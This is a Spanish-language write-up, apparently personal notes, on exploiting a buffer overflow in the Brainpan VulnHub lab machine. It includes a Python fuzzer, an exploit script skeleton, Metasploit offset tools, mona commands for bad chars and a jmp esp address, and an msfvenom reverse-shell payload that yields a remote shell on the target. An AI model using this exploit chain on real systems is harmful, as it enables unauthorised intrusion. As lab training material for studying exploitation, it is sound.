Para explotar un BoF, vamos a estar utilizando la máquina brainpan de la plataforma vulnhub:
[[MAQUINA BRAINPAN (Buffer Overflow)]]
```bash
https://www.vulnhub.com/entry/brainpan-1,51/
```
![[Pasted image 20231201132955.png]]
Hacemos el escaneo con nmap:
![[Pasted image 20231130105922.png]]
Accedemos al contenido del puerto 10000 ya que vemos que corre algo por HTTP:
![[Pasted image 20231130105957.png]]
Realizamos fuzzing web y encontramos el directorio /bin:
![[Pasted image 20231130110024.png]]
Vamos a ejecutar este binario dentro de una máquina windows para analizarlo mejor:
![[Pasted image 20231130110044.png]]
Y vemos que lo que hace es levantar un servicio por el puerto 9999 (puerto que ya estaba abierto en la máquina objetivo). Para ello lo compartimos con una máquina windows 7 para ejecutarlo desde ahí:
![[Pasted image 20231130110205.png]]
![[Pasted image 20231130110250.png]]
Y lo ejecutamos, donde podemos confirmar cómo se levanta un servicio por el puerto 9999:
![[Pasted image 20231130110407.png]]
El siguiente paso será instalar el inmunity debugger en la máquina windows para monitorear el programa, ya que el objetivo es ejecutar el binario para identificar si dispone de alguna vulnerabilidad que permita lanzar un shellcode contra nuestro verdadero target:
![[Pasted image 20231130110510.png]]
Una vez ejecutado el programa y habiéndolo cargado anteriormente, lanzamos un escaneo de nmap contra la máquina windows y vemos que inmunnity debugger lo tiene ejecutado por el mismo puerto:
![[Pasted image 20231130110407.png]]
Y también debemos configurar el mona, lo cual será el script que nos permita aplicar filtros y realizar comprobaciones más adelante, por lo que debemos dirigirnos al siguiente repositorio de github:
![[Pasted image 20231201110335.png]]
Nos descargamos el script de mona:
![[Pasted image 20231201110353.png]]
Y lo pegamos dentro de la carpeta de PyCommands del inmunity debugger:
![[Pasted image 20231130155816.png]]

El siguiente paso será establecer un directorio de trabajo donde vamos a trabajar con el inmunity debugger, por lo que hay que ejecutar el siguiente comando:
```python
!mona config -set workingfolder C:\Users\mario\Desktop\bof
```
![[Pasted image 20231201102345.png]]
El siguiente paso será utilizar un script de python para realizar el fuzzing para ir probando en qué punto se crashea el programa:
```python
#!/usr/bin/env python3
  
import socket, time, sys

ip = ""  
port = 9999
timeout = 1
prefix = ""
  
string = prefix + "A" * 100
  
while True:
   try:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
       s.settimeout(timeout)
       s.connect((ip, port))
       s.recv(1024)
       print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
       s.send(bytes(string, "latin-1"))
       s.recv(1024)
   except:
     print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
     sys.exit(0)
   string += 100 * "A"
   time.sleep(1)
```
Lo ejecutamos y vemos que el programa crashea a los 600 bytes:
![[Pasted image 20231130110825.png]]
Una vez ejecutado vemos que el EIP marca 414141, lo cual es lo que debe ocurrir (el EIP consiste en la dirección de la próxima instrucción que se ejecutará):
![[Pasted image 20230906192346.png]]
## OBTENER EL OFFSET
Una vez obtenido el punto exacto donde crashea el programa, vamos a necesitar el offset, lo cual consiste en la cantidad de bytes que hay desde el comienzo del búfer hasta el punto donde se produce el desbordamiento.

Y para ello vamos a enviar un número de esa data algo mayor, por lo que por ejemplo vamos a sumar +400 bytes, por lo que si el programa crasheaba a los 600, le añadimos unos +400 que hacen 1000.

---------------------------

Para este punto, vamos a necesitar otro script de python, que será el siguiente:
```python
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
Y ahora en nuestra terminal vamos a ejecutar un módulo de metasploit llamado pattern_create.rb donde insertaremos los 1000 bytes:
```python
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```
![[Pasted image 20231201100104.png]]
Y ahora esta data la vamos a pegar dentro de la variable Payload del script de python mostrado anteriormente:
![[Pasted image 20231201100147.png]]
Ahora nos dirigimos al Immunity Debugger y ejecutamos el siguiente comando de mona, ponemos 600 porque es donde el programa crashea:
```python
!mona findmsp -distance 600
```
Ejecutamos este exploit:
![[Pasted image 20231201100459.png]]
Y en el inmunnity debugger nos debería de salir otro número en el EIP:
![[Pasted image 20231201101012.png]]
Una vez obtenido este número de EIP, ya podemos obtener el offset ejecutando este comando:
```python
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 72413172
```
![[Pasted image 20231201101101.png]]
Lo añadimos a nuestro exploit, además de añadir BBBB en la variable retn:
![[Pasted image 20231201101201.png]]
Lanzamos nuevamente el exploit:
![[Pasted image 20231201101444.png]]
Y deberíamos de tener este resultado en el EIP:
![[Pasted image 20231201101501.png]]
## BAD CHARS
El siguiente paso será obtener los bad chars, lo cual consiste en que para ciertos servicios existen algunos caracteres que no se aceptan, provocando una ejecución errónea cuando generamos la shellcode. Estos caracteres se denomina bad character y debemos de eliminarlos de nuestro exploit.

------------------------------

Para testearlo, vamos a instalar la librería badchars de python:
![[Pasted image 20230906194513.png]]
Y con este comando generamos las badchars totales:
![[Pasted image 20230906194536.png]]
Y añadimos esto dentro de nuesto script de python en la variable payload:
![[Pasted image 20230906195052.png]]
Y ahora vamos ejecutar el siguiente comando en el Immunity !mona bytearray -b "\x00" para que tenga un archivo con el que comparar el de la aplicación, y si hay algún bad char nos lo llegaría a mostrar:
![[Pasted image 20231201102116.png]]
Y vemos que se nos guarda este reporte en el archivo llamado bytearray (gracias a que al principio del todo hemos establecido el entorno de trabajo):
![[Pasted image 20231201102504.png]]
Reiniciamos el binario en el inmmunity debugger:
![[Pasted image 20231130152020.png]]
Lanzamos nuevamente el exploit y nos fijamos en el número ESP:
![[Pasted image 20231201102609.png]]
![[Pasted image 20231201102638.png]]
Una vez obtenido el número de ESP, ejecutamos el siguiente comando para comprobar la existencia de bad characters:
```python
!mona compare -f C:\Users\mario\Desktop\bof\bytearray.bin -a 005FF910
```
Y se nos debería abrir esta ventana:
![[Pasted image 20231201103106.png]]
Y no tenemos ningún bad char (a excepción del \x00 que ese siempre es bad char):
![[Pasted image 20231201103134.png]]
Si hubiera algún bad char, habría que quitarlo del exploit:
![[Pasted image 20231201103240.png]]
## POINTER
Ahora tenemos que darle un punto de salto donde ejecutar, es decir, con el pointer el atacante puede dirigir la ejecución del programa hacia código malicioso, por lo que con este comando estaríamos buscando las instrucciones de "jmp esp". Por lo que ejecutamos el siguiente comando, con los badchars que nos haya aparecido anteriormente (en nuestro caso cómo mínimo es el x00 ya que este número siempre es un bad char):
```python
!mona jmp -r esp -cpb "\x00"
```
Y se nos muestra el pointer, el cual es 0x311712f3:
![[Pasted image 20231201103636.png]]
Ahora volvemos a ejecutar el programa haciendo clic en el siguiente botón, donde se nos debería abrir un apartado para insertar datos:
![[Pasted image 20231201103842.png]]
Aquí pondremos el pointer obtenido anteriormente:
![[Pasted image 20231201103911.png]]
Damos a OK y nos fijamos en el siguiente campo:
![[Pasted image 20231201103959.png]]
Lo seleccionamos y hacemos clic en F2, donde a continuación le daremos al play:
![[Pasted image 20231201104056.png]]
## GENERAR SHELLCODE
Ahora ya lo tenemos todo preparado para generar el shellcode, por lo que usaremos msfvenom de la siguiente forma:
```python
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.32 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```
![[Pasted image 20231201104319.png]]
Pegamos este resultado en la variable payload del exploit.py:
![[Pasted image 20231201104514.png]]
Y cambiamos las siguientes variables, donde la variable retn es el número del jmp que vimos anteriormente pero al revés; y el padding significa el conjunto de datos adicionales que se añaden a la estructura de datos:
```python
retn= "\xf3\x12\x17\x31"
padding = "\x90" * 16
```
![[Pasted image 20231201104946.png]]
Ponemos la IP real del objetivo (ya no estamos testeando con el inmunity debugger, sino que atacaremos al target real):
![[Pasted image 20231201105050.png]]
Lo ejecutamos:
![[Pasted image 20231201105126.png]]
Y mientrar estamos escuchando con netcat, habremos recibido la reverse shell gracias al shellcode generado anteriormente:
![[Pasted image 20231201105139.png]]
